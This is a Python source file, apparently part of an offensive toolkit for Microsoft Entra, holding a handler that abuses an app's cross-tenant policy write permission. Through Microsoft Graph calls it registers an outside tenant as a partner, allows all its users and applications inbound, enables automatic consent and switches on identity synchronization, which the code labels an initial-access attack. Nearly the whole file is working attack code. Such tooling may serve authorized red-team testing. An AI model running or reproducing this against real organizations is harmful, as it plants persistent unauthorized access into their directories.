from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.cross_tenant_handler')


class CrossTenant_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "Policy.ReadWrite.CrossTenantAccess" in request.roles:
            logger.info('tid: %s, appid: %s may be vulnerable to cross_tenant vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "CrossTenantAccessRWVectors"
            message = ""
            error = "CrossTenantAccessRWVectors - failed"
            conf = request.attack_config['crossTenant']
            
            logger.debug("Policy.ReadWrite.CrossTenantAccess - Allows the app to read and write your organization's cross tenant access policies without a signed-in user.")

            logger.debug("Attack vector - initial access.")         
            try:
                
                create_message_URL = "https://graph.microsoft.com/beta/policies/crossTenantAccessPolicy/partners"
                message_obj = {
                    "tenantId": conf["tenantId"]
                }

                result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                
                if result.status_code == 201:
                    create_message_URL = "https://graph.microsoft.com/beta/policies/crossTenantAccessPolicy/partners/" + \
                                        conf["tenantId"]
                    message_obj = {
                        "b2bCollaborationInbound": {
                            "usersAndGroups": {"accessType": "allowed",
                                            "targets": [{"target": "AllUsers", "targetType": "user"}]},
                            "applications": {"accessType": "allowed",
                                            "targets": [{"target": "AllApplications", "targetType": "application"}]}
                        }
                    }

                    result = requests.patch(create_message_URL, json=message_obj, headers=request.request_headers)
                    
                    if result.status_code == 204:
                        create_message_URL = "https://graph.microsoft.com/beta/policies/crossTenantAccessPolicy/partners/" + \
                                            conf["tenantId"]
                        message_obj = {
                            "inboundTrust": {},
                            "automaticUserConsentSettings": {"inboundAllowed":"true"}
                        }

                        result = requests.patch(create_message_URL, json=message_obj, headers=request.request_headers)
                        
                        if result.status_code == 204:
                            create_message_URL = "https://graph.microsoft.com/beta/policies/crossTenantAccessPolicy/partners/" + \
                                                conf["tenantId"] + "/identitySynchronization"
                            message_obj = {
                                "userSyncInbound": {"isSyncAllowed": "true"}
                            }
                            result = requests.patch(create_message_URL, json=message_obj, headers=request.request_headers)
                            
                            if result.status_code == 204:

                                create_message_URL = "https://graph.microsoft.com/beta/policies/crossTenantAccessPolicy/partners/" + conf["tenantId"] + "?$select=tenantId&$expand=identitySynchronization"
                                result = requests.get(create_message_URL, headers=request.request_headers)
                                
                                if result.status_code == 200:
                                    json = result.json()
                                    identitySynchronization = json["identitySynchronization"]
                                    tenantName = identitySynchronization["displayName"]
                                    message += "Setup cross tenant synchronization to: %s \n" % (tenantName)
                                    
                                else:
                                    message += "Setup cross tenant synchronization to: %s \n" % (conf["tenantId"])
                                status = True


                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in CrossTenant_Handler function")
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))
        return super().handle(request,responses)
